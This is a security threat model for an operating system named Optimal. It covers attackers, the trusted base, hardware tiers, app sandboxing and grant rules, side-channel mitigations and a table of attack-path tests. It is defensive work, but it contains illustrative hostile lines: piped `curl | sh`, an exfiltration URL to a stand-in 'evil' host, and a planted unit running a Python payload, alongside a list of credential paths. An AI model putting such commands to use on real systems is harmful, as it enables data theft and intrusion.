# Threat model

Security is pillar 2 and an absolute focus. This file says exactly what that
means: who we defend against, what we protect, what has to be trusted, and,
for every attack path, which mechanism closes it and which test proves it. A
security claim that isn't in the table at the bottom isn't a claim Optimal
makes.

## The headline promise, stated precisely

"Nobody can read a user's data remotely" means:

1. **Code that arrives from the network** (a web page, an email attachment, a
   downloaded app, a game, a script piped into a shell, a Windows program
   under Wine) runs only with the rights of the app that runs it. It cannot
   read files, keys, the screen, the microphone, the camera or input outside
   that app's grants, and it cannot send what it can read to the network
   unless that app was allowed both.
2. **Nothing on the network can talk to the machine** unless the user started
   that conversation or explicitly opened a service.
3. **The vendor (us) cannot read user data either.** No telemetry, no key
   escrow, no remote access, no account required. Updates can change code,
   so update signing is part of the trusted base and has its own defences
   ([boot.md](boot.md)).
4. **A stolen or lost device** that is powered off gives up no user data. A
   locked or suspended one gives up no data in the protected classes
   ([storage.md](storage.md)), whose keys are evicted by default. Until
   disk encryption stage 2, the scorecard shows this part as "partial".

What it does **not** promise: that an app the user granted access to a file
won't misuse that file. Grants are explicit and narrow so the damage is
bounded: apps start with no file or device grants, and the default profile
includes outbound network only.

## Attackers

| # | Attacker | Can do | Example |
|---|---|---|---|
| A1 | Remote network | send any packet to any open port or reply path, answer DHCP, DNS, NTP, router advertisements, run a fake Wi-Fi network | worm, malicious hotspot |
| A2 | Malicious content | make an app parse hostile input | web page, image, font, video, document, game mod |
| A3 | Malicious app or script | run arbitrary user code inside one app's sandbox, with that app's grants | trojan, compromised game, `curl \| sh`, an npm postinstall script |
| A4 | Compromised update or dependency | ship code that we sign, or that our build pulls in | stolen signing key, poisoned crate |
| A5 | Malicious device | plug in USB, Thunderbolt/USB4, PCIe, a monitor (DDC/EDID), Bluetooth | BadUSB keyboard, DMA attack device, malformed descriptors |
| A6 | Evil maid | hands on the machine while it is off, suspended or locked: reflash the disk, read it, sniff or interpose on the TPM bus, reset the TPM | stolen laptop, hotel room |
| A7 | Another local user | log in as another user, possibly an administrator | family PC |

Out of scope, said out loud: chip decapping, a malicious CPU or firmware
vendor, and cold-boot attacks on DRAM of a running, unlocked machine.
(Memory encryption, AMD SME and Intel TME, is enabled where present, and the
scorecard says whether it is on.) Firmware TPMs (AMD fTPM, Intel PTT) are
weaker than discrete ones against physical attack (faulTPM showed AMD's can be
broken in hours), and an active bus interposer can defeat any TPM's sealing.
So the PIN is never the only secret: it is stretched with Argon2id (memory
min(1 GiB, RAM/4) but at least 64 MiB, at least 4 passes, passes raised to
reach about 2 s on the machine; the same rule for every passphrase and KDF,
[storage.md](storage.md)) and mixed into the disk key ([boot.md](boot.md)).
An encrypted install needs at least 256 MiB of RAM. A PIN is allowed
only with a discrete TPM; on fTPM machines install requires a passphrase
estimated at 60 bits or more instead. Against those attacks disk protection
is as strong as the stretched PIN or passphrase, and the scorecard says so.

## Trusted computing base

Everything below can break every promise if it has a bug. It is kept small,
tested hardest, and listed so nobody pretends the TCB is "just the unsafe
core".

- CPU microcode, platform firmware and device firmware the kernel loads into
  DMA-capable devices: GPU firmware (GuC, MES, PSP, SMU), Wi-Fi and Bluetooth
  firmware (not ours; see hardware tiers). Each blob is pinned by SHA-256 in
  the firmware ledger with its version.
- Every device with ATS enabled, and its firmware: its translated requests
  bypass the IOMMU. Each is listed here per machine and on the scorecard
  ([drivers.md](drivers.md)).
- The bootloader ([boot.md](boot.md)) and the recovery image.
- The unsafe kernel core (tier 0), every in-kernel safe-Rust component (tiers
  1 and 2 in [drivers.md](drivers.md)), and every dependency of theirs. This
  includes the TPM service, which lives in the kernel: the kernel alone holds
  raw TPM access, and user space reaches the TPM only through the TPM broker
  API, a capability-gated kernel interface that exposes named operations
  (unwrap a user key, bump the replay counter, seal a hibernation image key),
  never raw TPM commands.
- **User-space TCB**, each process with a size budget in the table below.
- Release and policy signing keys.

Budgets count lines of our own code, with dependencies counted once in the
ledger; for upstream code the budget is the pinned version's measured size,
and growth of more than 10% at a version bump needs a recorded review. The
scorecard shows each component's size against its budget, and CI fails a
change that exceeds one.

| Component | Origin | Budget |
|---|---|---|
| Permission broker and portals, including the process portal (list and signal across app PID namespaces) ([capabilities.md](capabilities.md)) | ours | 30,000 lines |
| D-Bus per-app proxies | ours | 5,000 lines |
| D-Bus broker | dbus-broker, pinned | measured size |
| User service manager (D-Bus activation, `systemd --user` subset) | ours | 10,000 lines |
| Seat and input service | ours | 8,000 lines |
| udev-compatible daemon | ours | 6,000 lines |
| Lock screen | ours | 4,000 lines |
| Store service and Flatpak launcher | ours | 15,000 and 5,000 lines |
| Document portal file system (tier 3, FUSE protocol) | ours | 6,000 lines |
| Storage service, log service | ours | 8,000 and 3,000 lines |
| Update client (TUF metadata, transparency proofs) | ours | 8,000 lines |
| DHCP client, resolver, time service | ours | 4,000, 10,000 and 3,000 lines |
| Wi-Fi supplicant | ours | 20,000 lines |
| Compositor, with XWayland servers' host side | upstream, pinned, patched | 60,000 lines of compositor code |
| Mesa driver loaded into the compositor | upstream, pinned | measured size; only the present GPU's driver is installed. Exposure: it imports app buffers (dma-buf, shm) for compositing; it never compiles app shaders or runs app command streams, which go to the app's own Mesa and the kernel GPU driver |
| Audio server permission layer | PipeWire, pinned | measured size |
| Recovery image | ours, plus the release kernel | 10,000 lines beyond the kernel; image at most 64 MiB |

Not trusted: every app, every tier-3 driver, every network peer, every
device, every file system image Optimal did not create, and every image,
icon or cursor an app supplies (these are decoded in a sandboxed helper,
never inside a TCB process).

## Hardware security tiers ("runs on almost anything" without lying)

Two independent axes. Every machine has one of each; both are shown at
install, in Settings and on the scorecard (one column per combination
measured).

**Boot axis**

| Tier | Needs | What holds |
|---|---|---|
| **B1** | UEFI Secure Boot on, trusting Optimal (path 1 or 2 in [boot.md](boot.md)), TPM 2.0 | verified and measured boot; TPM + PIN unlock; tamper refuses to unseal |
| **B2** | Secure Boot on and trusting Optimal, no TPM | verified boot; passphrase-only unlock; no measurement, so an attacker who can get firmware to run their signed code isn't detected by the disk unlock. Anti-rollback holds against OS-level attackers only (against a physical attacker only with owner keys enrolled), and the scorecard says so |
| **B3** | UEFI with Secure Boot off, or not trusting Optimal (with or without a TPM) | **no verified boot**: the boot chain checks its own signatures but anyone can replace it. TPM sealing is not offered (it would seal to an unverified chain). Passphrase-only unlock |
| **B4** | Legacy BIOS | as B3 |

Until Optimal Boot path 1 or 2 works on a given PC, that PC is B3, and the
scorecard says "verified boot: only with owner keys enrolled".

**DMA axis**

| Tier | Needs | What holds |
|---|---|---|
| **D1** | an IOMMU with every PCI segment covered, every IOAPIC and HPET in scope, interrupt remapping on, compatibility format blocked, and x2APIC where present; and DMA blocked before the kernel takes over, by firmware pre-boot DMA protection (the DMAR opt-in flag with PMRs or translation on, or the IVRS equivalent) or by Optimal Boot, which sets a deny-all IOMMU or PMRs before `ExitBootServices` ([drivers.md](drivers.md)) | DMA attacks blocked; per-device isolation. A D1 machine with neither pre-boot protection shows a named "boot DMA window" exposure on the scorecard: from power-on until the kernel's IOMMU setup, a device can DMA into memory, including the kernel image after the loader checked it |
| **D2** | no IOMMU, or an IOMMU short of D1's conditions; the reason is named | Devices the IOMMU does cover keep their domains. Other DMA attacks from a malicious device, or from compromised device firmware, are **not** blocked. External PCIe tunnels are refused: Bus Master Enable stays clear on Thunderbolt downstream and hotplug bridges and root ports from Phase 1c (a device's own BME is never relied on), and on firmware connection-manager controllers the ICM driver refuses the tunnel. A tier-1 or tier-2 driver bug can't aim DMA at kernel data: `DmaBuffer`s and rings come from a dedicated DMA region and only streaming maps are bounced; descriptor memory the device reads is a `DescRing<D>` whose `Iova` fields are built only from granted handles (no raw byte access); PRP and SGL lists come from typed builders; GPU page-table entries are built only from `DmaBuffer` or `Iova` handles (proof target 13 extended to D2), and a GPU without per-process GPU page tables (pre-PPGTT) gets no acceleration; DMA-address registers (NVMe ASQ/ACQ, ring bases, DCBAAP, display surface, cursor and LUT addresses, SMU DRAM-address messages) are written only by the core from a `DmaBuffer` handle. Tier 3 relies on the IOMMU alone, so on D2 no tier-3 process is given a DMA-capable device. Wi-Fi and Bluetooth radios that do PCIe DMA stay off until the user accepts a warning named "remote DMA exposure", and from then the scorecard says the remote promise does not hold on that machine (USB-attached radios can't DMA and are not affected). Big warning at install, with how to turn the IOMMU on if the firmware can |

## Rules every component follows

### Default deny

Apps start with no file or device grants; the default profile includes
outbound network only. The network is closed inbound. Devices start
unauthorised. There is no "root that can do anything".

### Files and network together are one explicit grant

The most common real-world "remote read" is an app that can both read files
and phone home. So:

- **Network access** comes from the default profile for a program without a
  manifest, or is declared in the app's manifest and approved at install, or
  requested later through the network portal ([capabilities.md](capabilities.md)).
  It is never prompted for lazily inside a system call. It is enforced by a
  per-identity egress filter checked on every connect and send, not by
  swapping network namespaces, so a grant or revocation reaches sockets that
  are already open. A network grant is **outbound only**. An app without it
  gets `ENETUNREACH`, immediately, for any non-loopback destination. Loopback
  is per identity: an app reaches loopback ports bound by its own identity,
  and reaching another identity's port (a dev server started from the
  terminal, opened in the browser) needs a per-port grant naming both; that
  connection is a direct channel (below). **Binding always succeeds.** A
  socket bound to a wildcard address receives only loopback connections, and
  inbound unicast traffic to a non-loopback address is dropped, unless the
  identity holds an inbound grant for that port.
- **DNS** goes through the system resolver at `127.0.0.53` (named in
  `resolv.conf`), a TCB service, not an identity's loopback port, that answers only
  identities holding outbound network; any other identity gets
  `ECONNREFUSED`, so lookups can't carry data out.
- **Persistent file grants** (folders, or files granted to an app for
  longer than one use) and network access can be held together only if the
  user approved that combination explicitly, in a prompt that says so in
  plain words ("This app will be able to read *Documents* and send data to
  the internet").
- **A file the user picks** in the file chooser for one use (an upload, an
  attachment, "open this photo") is handed to the app as a one-use document-portal entry even if the
  app has network access, because the user chose to give that file to that
  app. It doesn't widen the app's grants.
- **Secrets are used, not read.** SSH keys, GPG keys, browser and app
  passwords, and tokens live in agent services (an SSH agent, a GPG agent,
  the secret service), each its own app. Programs use them through the
  agent's socket; the agent confirms the first use per session with a
  prompt naming the requesting app (see below). The files themselves
  (`~/.ssh`, `~/.gnupg`, keyrings, browser profiles, and every app's
  private home, `~/.var/app/<id>`, which is mounted as that app's `$HOME`)
  are **protected paths**, never part of any folder grant.
  So are the places that decide what runs with which identity:
  `~/.config/autostart`, `~/.local/share/applications`, `~/Applications`,
  `~/.local/share/dbus-1/services`, `~/.config/systemd/user`,
  `~/.config/environment.d`, `~/.config/mimeapps.list`, and the whole
  install directory of every unpackaged app that holds a grant (its
  executable, libraries and data files such as `app.asar`). These are
  written only through the launcher portal. `~/.local/bin` is protected from
  every identity except the terminal's, which can write it so
  `pip install --user` and `cargo install` work; what is written there
  carries the kernel provenance attribute (below).
- **Writable grants name their readers.** Data an app writes into a folder
  that another app may read is reachable by that app, so a folder one
  identity can write and another can read joins the two as a direct channel
  (below), and the prompt for a writable folder grant names every app
  holding network together with a grant to that folder. A writable grant to
  any folder inside the terminal's home is a direct channel to the terminal,
  because the terminal runs what is written there (`.git/hooks`, a
  `Makefile`, `.envrc`); its prompt says "*App* can run code as Terminal".

### The terminal

People use terminals to work on their files, so the terminal app gets the
user's home directory **minus the protected paths**, and that is the one
broad home grant in the system. It is not given network access by default;
the first time a program run from it needs the network, the shell reports
the denial and the terminal shows a one-click request for the
"terminal: home + network" combination, with the warning above. Programs
run from the terminal inherit the terminal's identity (that's what makes
`git`, `make` and `cargo` work unchanged), so a user who grants both is
explicitly trusting what they run there; protected paths stay out of reach
either way, which is what keeps `curl | sh` from reaching SSH keys. A
terminal-identity process that execs a file whose provenance is another
identity gets `EACCES` until the user approves that file in a prompt naming
its provenance. When the launcher spawns a different identity from a
terminal (`flatpak run`, a desktop file), that process gets a fresh pty, so
it can't inject input into the terminal. The launcher relays that pty's
output to the terminal with OSC 52 (clipboard write), title-set and
report-request sequences removed, so the terminal ignores them from every
foreign identity (lockdown table).

### App identity can't be forged

Grants belong to an identity, so the identity has to be unforgeable:

- A packaged app's identity is its store or Flatpak ID. An unpackaged
  program's identity is its **path plus the hash of its launch closure**:
  the executable, its `PT_INTERP` and every library loaded from a path
  outside the system image; for an interpreter, the interpreter plus the
  script's hash (plus the argument string for `-c` style calls, so
  `python3 a.py`, `python3 b.py` and `sh -c '<x>'` are three identities);
  for an AppImage, the AppImage file. When the hash changes, its grants
  reset, except that grants carry across an update whose writer's
  provenance is the app itself (a self-updater such as Steam or a Firefox
  tarball).
- An executable written by an app identity carries that identity as its
  provenance, in a kernel-set extended attribute no app can write or
  remove. Launched from the desktop the first time, it gets no network
  until a prompt naming it and its provenance is approved. The service
  manager and D-Bus activation apply the same provenance rule to what they
  start.
- Only the launcher and the service manager hold the kernel capability
  "spawn with identity X". Every other process's children get the parent's
  identity, with grants only within the parent's.
- Two identities that share a direct channel (parent and child, D-Bus peers,
  shared IPC objects, a loopback connection between them, a folder one can
  write and the other can read, and traffic one relays to the other through
  PipeWire or D-Bus) are checked **as one principal**. The check is
  transitive: each session keeps a union-find of identities joined by any
  direct channel, live or past, and the union of the grants of the whole
  component must pass the files-and-network rule above, or the new channel
  is refused. Components split only at logout. Each app has its own IPC
  namespace (System V IPC, POSIX message queues, abstract Unix sockets).
  The overt channels are a closed list checked in as `design/channels.toml`, each
  with a test; covert channels (CPU and cache timing, `statfs` free space,
  lock contention) are out of scope, and their measured bandwidth is
  published on the scorecard.

### Prompts can't be spoofed

From Phase 5, portal and agent prompts appear on a dedicated virtual
terminal that only the kernel switches to, reached by a secure-attention key
(Ctrl+Alt+Delete) that the kernel handles before any app sees it and that
injected input can't produce. From Phase 7 the compositor draws them in a
layer apps can't draw over, capture or cover
([capabilities.md](capabilities.md)). Each prompt shows the requesting app's
attested identity.

Input is trusted by its source, not its content. The kernel tags every input
event with the device that produced it. The secure-attention key and every
prompt answer are accepted only from an in-kernel parser (PS/2, USB boot
protocol, and the in-kernel I2C-HID parser for internal laptop keyboards,
promoted with the in-kernel fuzz thresholds) or from a per-device HID
process (one process per device) whose device passed the typed-code
confirmation; never from a Bluetooth keyboard unless the user opts that
keyboard in by name. So a compromised Bluetooth stack or HID process can't
approve a prompt or fake the secure-attention key, and one hostile USB device
can't read another device's keys. The polled xHCI boot-keyboard reader stops
when the Phase 6 xHCI driver binds. The PIN on resume from suspend is typed
through the in-kernel paths, which work while user space is frozen.

### No confused deputies

The launcher portal, the open-URI portal, file and URL handlers and D-Bus
activation never pass a command line, arguments, a `file://` URI or a file
to another app on an app's behalf without a confirmation prompt naming
both apps. The terminal can't be started with a command by another
app at all.

Every TCB service that sends traffic for an app (the resolver, open-URI,
notifications, the email portal) checks the caller's grants first, because
a networked deputy is a way out for an app without network. Open-URI with
any scheme other than `file` from an identity without outbound network
shows a prompt naming both apps and the full URL, so
`https://evil/?d=<data>` is visible before it is sent. The OAuth rule that
auto-grants a browser the loopback port of the app that opened it applies
only if that app already holds network; otherwise the connection needs the
per-port grant, and like any cross-identity loopback connection it joins the
two as one principal.

### Shared per-user channels are mediated

All of a user's apps run under that user's uid, so every channel that
crosses app boundaries without the file system is mediated per app:

- **D-Bus:** each app reaches the session bus only through its own proxy
  with a policy from its manifest (talk to its own name, the portals, and
  listed services; never the secret service directly, never the user
  service manager's control interface).
- **Audio and video:** PipeWire runs with per-app permissions set by the
  portal: no app can record the microphone or capture another app's stream
  without a grant.
- **Wayland:** every app connects through a security context
  (`wp_security_context_v1`). Privileged protocols (screen capture, data
  control, virtual keyboard and pointer, layer shell, input method) are
  available only to TCB clients and to apps holding the matching grant.
- **X11:** each app that needs X11 gets its own XWayland server, so X11's
  lack of isolation stays inside one app.
- **Documents:** the document portal, a tier-3 file system mounted in every
  view, holds per-app entries for files the user picked, with persistence and
  revocation; portal file dialogs are forced in GTK and Qt
  ([capabilities.md](capabilities.md)).
- **Kernel keyrings** are per app. **`uinput`** is held only by the input
  service and compositor. The virtual-gamepad portal hands an app a `uinput`
  fd that accepts gamepad codes only; keyboard and pointer emulation (Steam
  Input) goes through a compositor-mediated virtual keyboard and pointer that
  reaches only the focused surface, behind a grant.
- **Clipboard** contents go only to the focused app on paste; background
  reads need a grant.

### Untrusted input is parsed outside the TCB where possible

Foreign and removable file systems, USB class drivers, HID report
descriptors, the 802.11 and Bluetooth stacks, image and font decoding for
the TCB, and network configuration protocols (DHCP, router advertisements)
run in tier 3 or in sandboxed services ([drivers.md](drivers.md)). Wi-Fi and
Bluetooth are split on every machine: a small tier-2 transport part (rings
and DMA, no frame parsing) and the tier-3 stack. What stays in the kernel
(TCP/IP, the system file system, the boot-protocol keyboard paths, the
internal I2C-HID keyboard parser, the radio transport parts, and the
pre-cap parser that reads the fixed-format Optimal header block before PCRs
are capped, [boot.md](boot.md)) is continuously fuzzed from the phase it
lands in (the pre-cap parser from 4b), to the thresholds in
[drivers.md](drivers.md). The FUSE protocol is fuzzed from Phase 5.

### Lockdown

No interface lets anyone run unsigned code in ring 0, read or write kernel
memory, change boot or Secure Boot state, or inject input. See the table.

### Side channels

Mitigations against leaks between processes, or from the kernel to a process,
are never off by default, whatever they cost; their cost is measured and
published. The kernel keeps a **per-CPU-model mitigation matrix** in the tree,
one row per vulnerability class, with the chosen mitigation and the microcode
it needs:

| Class | Mitigation |
|---|---|
| Meltdown, L1TF | page-table isolation (with PCID), L1D flush on VM entry |
| Spectre v1 | index masking: attacker-influenced indices, lengths and offsets in syscall, network, USB, ring and file system parsing enter as `Untrusted<T>`, which can only be used through masking accessors; a lint forbids indexing with values derived from parsing-crate inputs except through them |
| Spectre v2, BHI | eIBRS or retpolines per model, plus the branch-history clearing sequence on kernel entry where BHI applies |
| Retbleed, SRSO/Inception | return thunks or the vendor's safe-RET sequence per model, IBPB on entry where required |
| Cross-process branch poisoning | IBPB when switching between different apps, RSB filling on context switch |
| Speculative store bypass | SSBD for processes that ask (prctl) and always for sandboxed renderer processes that declare it in their manifest |
| MDS, TAA, MMIO stale data, RFDS | buffer clearing (`VERW`) on kernel exit; TSX disabled through `TSX_CTRL` where microcode allows; SMT per the rule below |
| GDS | microcode mitigation required; without it, AVX gather is disabled for apps |

**SMT.** On CPUs affected by MDS, L1TF, TAA or RFDS, **SMT is off by
default**, because a sibling thread can read kernel data that buffer clearing
and core scheduling don't remove. A CPU counts as affected when its
SMT-capable cores are, judged from `IA32_ARCH_CAPABILITIES` (`MDS_NO`,
`TAA_NO`, `RFDS_NO`) and the L1TF model table; TAA counts only where TSX
can't be disabled. The matrix lists the models: Intel Core and Xeon from
Nehalem through Coffee Lake and Skylake-SP (L1TF, MDS); Whiskey Lake,
Cascade Lake and Coffee Lake Refresh per stepping (MDS, or TAA where TSX
can't be disabled). The Atom cores Goldmont to Gracemont (RFDS) have no SMT,
so they never force it off, and hybrid parts such as Alder Lake, whose SMT
cores are unaffected, keep SMT. AMD CPUs are not affected by these four. On unaffected CPUs SMT is on with **core
scheduling** by default, so siblings only ever run threads of the same app.
On affected CPUs core scheduling is an opt-in that turns SMT back on and
protects app from app only; the setting and the scorecard say kernel data is
then exposed to the sibling. Linux baselines in
[benchmarks.md](benchmarks.md) boot with the same SMT setting (`nosmt` on
affected CPUs).

Everything depends on microcode, which loads first ([boot.md](boot.md)). The
proof-of-concept suite runs every published PoC for each class against the
running kernel, on the shipped default for each CPU model, plus a separate
run with the opt-in SMT-on setting that checks app-to-app leaks only; the
pass criterion is **zero bytes of secret recovered** above chance over 10^6
attempts.

### USB and external devices

- Authorisation is **per interface**, not per device, so a "storage" stick
  with a hidden HID interface gets its storage approved and its HID
  interface held.
- Storage and audio interfaces are approved automatically while the session
  is unlocked; anything new while locked waits for unlock and approval.
- A new keyboard or other HID interface must type a code shown on screen
  before its input is accepted (stops BadUSB).
- Thunderbolt/USB4 PCIe tunnels need explicit approval per device. A
  remembered identity only skips the prompt next time; it never relaxes the
  IOMMU, HID confirmation or any other check, because device identities can
  be spoofed. Where the controller supports the USB4 security challenge, it
  is used.

### Administrators

An administrator (granted through the administrator-action portal, which
always asks) can install and remove system-wide apps, change system
settings, create and delete accounts, and update the OS. An administrator
**cannot** read another user's files, reset another user's login secret in a
way that unlocks their data (resetting creates a fresh, empty key; the old
data needs the old secret or that user's recovery key), install software into
another user's session, or read another user's crash dumps.

### Crash reports stay local

App dumps go to the crashing user's encrypted storage, are redacted of app
memory by default, and are never uploaded unless the user chooses to send
one, each time, after seeing what is in it. Kernel dumps contain **kernel
memory only** by default (no user pages, no page cache), are encrypted to the
administrators' keys, and are stored in an administrator-only location.
Including a user's pages needs that user's consent, asked of each user whose
pages would be included. Every dump excludes key pages. Test (Phase 5):
with canary bytes in a key page, in a user's process memory and in a user's
page cache, a forced kernel crash produces a dump that holds none of them
unless that user consented, and no key bytes in any case.

### Supply chain

From Phase 1: every downloaded build input is pinned by SHA-256 (the Limine
tree, firmware packages, container images, GitHub Actions by commit hash);
`cargo-deny` and `cargo-vet` gate every change; and release builds are
reproducible and a second builder must produce identical bytes before
anything is signed. Release signing keys never live in CI ([boot.md](boot.md)).

## Lockdown table

Optimal has no all-powerful root; these hold for everyone, always. The
`lockdown` CI test checks each row's **expected result** exactly, from Phase 3
for the rows that exist then, growing with the ABI. Where a row differs from
Linux, the result is written in that test's intended-divergence expectation
file, which the test must match exactly ([compat.md](compat.md)).

| Interface | Expected result |
|---|---|
| `init_module`, `finit_module`, `delete_module` | `ENOSYS` (no loadable kernel modules) |
| `kexec_load`, `kexec_file_load` | `ENOSYS`. Optimal has no kexec: updates reboot through the loader, which checks the rollback floor |
| `/dev/mem`, `/dev/kmem`, `/dev/port`, `/proc/kcore`, `/dev/cpu/*/msr`, debugfs | do not exist |
| `iopl`, `ioperm` | `EPERM`; port I/O for tier-3 drivers comes only through a device capability for that device's ports |
| PCI config writes, `resource*` mmap | `EPERM` except through a device capability, never to BAR, MSI or command registers |
| `/proc/kallsyms`, `/proc/modules`, kernel log | zero addresses; kernel log readable only by the log service, pointers hashed |
| `/proc/sys` writes | only the documented per-namespace knobs; everything else `EPERM` |
| `bpf()` | `EPERM`. Classic BPF only, for seccomp and socket filters |
| `perf_event_open` | own process, or one it holds a debug capability for ([capabilities.md](capabilities.md)); user-space counters only |
| `userfaultfd` | user-mode faults only (no kernel-mode faults) |
| `open_by_handle_at`, `name_to_handle_at` | `EPERM` (they bypass path-based views) |
| `uinput` | absent from app views; only the input service and compositor hold it; apps get gamepad-only fds through the virtual-gamepad portal |
| `/dev/tpm*`, `/dev/tpmrm*` | do not exist in any view; the kernel's TPM service alone holds raw TPM access, and user space reaches it only through the TPM broker API |
| `TIOCSTI` | `EPERM`, always |
| `TIOCLINUX` | absent (`ENOTTY`) |
| OSC 52, title-set and report-request escape sequences | removed by the launcher from the output of every identity other than the terminal's; a process of another identity always gets a fresh pty |
| kernel text patching | only the trace-point text poke, which switches each trace point between its two precompiled states through a temporary private mapping; nothing else may modify kernel text, and kernel text and its direct-map aliases stay read-only ([verification.md](verification.md), target 1) |
| NVMe and SCSI passthrough ioctls, firmware download | absent from app views; only the storage service, with signed firmware |
| EFI variables (`/sys/firmware/efi/efivars`) | read-only; writes only by the update and boot services, never to PK, KEK, db, dbx, MOK or boot entries except through their signed flows |
| `mount` of block devices or image files (loop), from any namespace | only through the tier-3 file system server ([storage.md](storage.md)), never an in-kernel parser |
| `CAP_*` inside a user namespace | grants authority only over objects owned by that namespace, never kernel-wide ([capabilities.md](capabilities.md)) |
| hibernation | class-C keys and pages are evicted before the image is written, so the image holds none ([storage.md](storage.md)); the image is encrypted and authenticated, carrying the release's security version. On B1 its key is a per-boot random image key, generated before capping and sealed into a persistent TPM object with the full disk policy (PCR 4, 8 and 9 signed, PCR 7, the rollback floor, `TPM2_PolicyAuthValue` with the stretched PIN), and kept in kernel RAM until hibernate; resume unseals it before capping, so it needs the PIN. Otherwise the key comes from the passphrase. Resume refuses an image it can't authenticate or whose version is below the rollback floor |
| ACPI table override, custom DSDT | not supported |

## Every attack path, its defence and its test

The phase in brackets is when the test becomes a gate. Every row is named,
by its path, in that phase's done-when in the roadmap, and a CI script fails
if the two lists differ. Every test stays in CI forever. The scorecard lists
each row as pass, fail or not yet built, per hardware tier.

| Path | Defence | Test (phase) |
|---|---|---|
| A1 → open port | nothing listens; default-deny inbound firewall; inbound only through a per-port grant | IPv4 and IPv6 scans of a fresh install find 0 open ports (6) |
| A1 → listening app | network grants are outbound only; a wildcard socket receives only loopback and non-loopback unicast inbound is dropped without an inbound grant | an app holding network binds a wildcard and a non-loopback address; both binds succeed and neither is reachable from another host; with an inbound grant for one port, exactly that port is reachable (6) |
| A1 → network stack | TCP/IP in safe Rust, fuzzed, index masking; proof target 15 (packet parsers never panic or read out of range) | 10^9 fuzz executions, no open crash; IPv6 RA/NDP/ICMPv6 included; target 15 at B (6) |
| A1 → DHCP, DNS, NTP, Wi-Fi supplicant | each a sandboxed service in the TCB list, fuzzed; DNS-over-TLS or DNSSEC validation where available; time from NTS, never below a floor: a stored, signed time floor shipped in the image until Phase 7, then the last-seen update metadata time | each service fuzzed 10^8 executions; spoofed-NTP test can't roll the clock back below the floor (6) |
| A1 → Wi-Fi, Bluetooth drivers | split on every machine: tier-2 transport (rings and DMA, no frame parsing) and tier-3 802.11 and Bluetooth stacks in their own IOMMU domain | frame fuzzing of the tier-3 stacks 24 h with no open crash; the transport parts fuzzed to the thresholds in [drivers.md](drivers.md) (6) |
| A1 → compromised radio firmware → DMA | on D1, the radio's IOMMU domain holds only its rings and buffers; on D2, radios that do PCIe DMA stay off until the user accepts the "remote DMA exposure" warning | our vfio-user hostile device server on the pinned QEMU, bound to the Wi-Fi transport, DMAs and sends MSIs outside its domain; every attempt faults and is logged; on a D2 machine the radio stays off until the warning is accepted, and the scorecard then shows the remote promise as not holding (6) |
| A1 → compromised Bluetooth stack or HID process → input | the secure-attention key and prompt answers are accepted only from in-kernel parsers or a typed-code-confirmed per-device HID process, never from Bluetooth unless opted in by name | a compromised Bluetooth stack and a compromised HID process each emit Ctrl+Alt+Delete and keypresses on the prompt terminal; no prompt opens or is answered (6); extended to compositor-drawn prompts (7) |
| A2 → app parser bug | the app is sandboxed | sandbox escape suite (7) |
| A3 → other apps' data | per-app file views, capabilities, per-app `/proc`, PID namespaces, `ptrace` policy | hostile-process suite: read another app's files, protected paths, another process's memory (`/proc/pid/mem`, `process_vm_readv`, `ptrace`), forge or guess a capability, map another app's frames. All fail, each with its defence present, not by `ENOSYS` (5, grows every phase) |
| A3 → kernel | memory safety, proofs, fuzzing, SMEP/SMAP, KASLR; kernel CET shadow stacks and indirect-branch tracking from the phase they land (Phase 11 at the latest, [ROADMAP](../ROADMAP.md)) | syscall fuzzing (3), proof targets 4 to 6 (3), lockdown test (3); a kernel ROP and a forward-edge hijack test fault (11, or earlier in the phase kernel CET lands) |
| A3 → forged identity | launch-closure hash, provenance, protected install directories and launch paths, spawn-with-identity capability held only by the launcher and service manager | **identity-forge suite**: an app replaces or edits a granted executable, a library beside a granted unpackaged app, or a granted app's script; writes into each protected launch path (a `systemd --user` unit running `python3 -c '<payload>'`, a D-Bus service file, `environment.d`, `mimeapps.list`); spawns a child claiming another identity; execs a copy of a granted binary from another path; runs an executable it wrote from the desktop; two Python apps get different identities; no grant transfers and the new code gets no network before its prompt (5) |
| A3 → terminal | foreign-provenance exec refused, writable grants in the terminal's home are direct channels, fresh pty per identity, `TIOCSTI` refused, escape sequences filtered | an app with a writable grant to `~/Projects` plants a git hook and a `Makefile`, and the grant needed the "can run code as Terminal" prompt; the terminal execs the hook and gets `EACCES` until approved; a process of another identity started from the terminal tries `TIOCSTI`, `TIOCLINUX`, OSC 52 and report sequences; all fail (5) |
| A3 → shared channels, D-Bus and keyrings | D-Bus proxy, per-app keyrings, per-app IPC namespace | for each, an app without the grant tries to use it and fails (5) |
| A3 → shared channels, PipeWire | PipeWire permissions | an app without the grant tries to record or capture another app's stream and fails (6) |
| A3 → shared channels, Wayland and X11 | Wayland security contexts, per-app XWayland | an app without the grant tries each privileged protocol and another app's X11 server and fails (7) |
| A3 → confused deputy | portals pass nothing without confirmation; networked TCB services check the caller's grants | an app tries the launcher, open-URI, handlers and D-Bus activation to run a command or open a file through another app; all need confirmation; an app with files and no network calls open-URI with an `https` URL carrying data and gets a prompt showing the full URL, opens a loopback page in the browser and gets no auto-grant, and sends a notification and an email-portal message carrying data, which are refused (5) |
| A3 → permission broker and portals | fuzzed, size-capped TCB service | 10^8 protocol fuzz executions, no open crash (5) |
| A3 → D-Bus proxy and broker | fuzzed, size-capped TCB service | 10^8 protocol fuzz executions against the proxy and dbus-broker, no open crash (5) |
| A3 → Flatpak launcher | fuzzed TCB service; `org.freedesktop.Flatpak` talk-name refused | 10^8 fuzz executions over manifests and launch requests, no open crash; `flatpak-spawn --host` fails (5) |
| A3 → document portal | tier-3 file system, fuzzed FUSE protocol | 10^8 protocol fuzz executions, no open crash; an app reaches only its own entries, and a revoked entry is gone (5) |
| A3 → resolver | TCB service at `127.0.0.53` answering only identities with outbound network | 10^8 protocol fuzz executions, no open crash; an identity without network gets `ECONNREFUSED` (6) |
| A3 → PipeWire | pinned upstream with our permission layer, fuzzed | 10^8 protocol fuzz executions, no open crash (6) |
| A3 → seat service | fuzzed, size-capped TCB service | 10^8 protocol fuzz executions, no open crash (7) |
| A3 → compositor | 60,000-line cap, security contexts, Mesa exposure limited to buffer import | 10^8 Wayland protocol fuzz executions, no open crash, with hostile dma-buf and shm buffers included (7) |
| A3 → prompt spoofing, console | prompts on a dedicated virtual terminal reached by the secure-attention key | an app draws a fake prompt on its own terminal, injects keystrokes, and tries to switch virtual terminals; no grant is made without the secure-attention key and a keypress on the prompt terminal (5) |
